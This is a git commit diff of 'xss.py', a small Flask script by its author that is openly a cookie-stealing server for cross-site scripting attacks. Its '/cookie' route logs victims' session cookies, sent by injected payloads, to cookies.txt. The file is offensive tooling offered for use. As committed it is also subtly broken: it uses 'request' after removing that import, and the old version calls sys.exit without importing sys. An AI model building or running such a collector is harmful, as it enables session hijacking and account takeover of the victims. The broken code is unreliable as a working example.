d5ff82ee2f37a0f40b206bdc0072556935d66791
Khaled Nassar <45688522+knassar702@users.noreply.github.com>
2020-03-25 19:24:55 +0200

    Add files via upload

--- xss.py
+++ xss.py
@@ -1,29 +1,15 @@
-try:
-	from flask import Flask,request
-	from termcolor import colored
-	from time import sleep
-except:
-	print('[!] Install The Modules .. ')
-	import os
-	os.system('pip install flask')
-	os.system('pip install termcolor')
-	os.system('pip install time')
-	sys.exit()
-print ('\n\t[ Steal Cookie Using Xss .. ]\n')
-print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
-sleep(2)
+
+from flask import Flask
 app = Flask(__name__)
 @app.route('/')
 def index():
 	return 'Hello ^_^'
-@app.route('/cookie',methods=['GET','POST'])
-def steal():
+@app.route('/cookie/<cookie>',methods=['GET','POST'])
+def steal(cookie):
 	if request.method == "GET" or request.method == "POST":
-		data = request.values
-		cookie = data.get('cookie')
 		with open('cookies.txt',mode='a') as f:
 			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
-		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
+		print('New Cookie')
 		return 'Thanks :)'
 if __name__ == '__main__':
 	app.run(host='0.0.0.0')
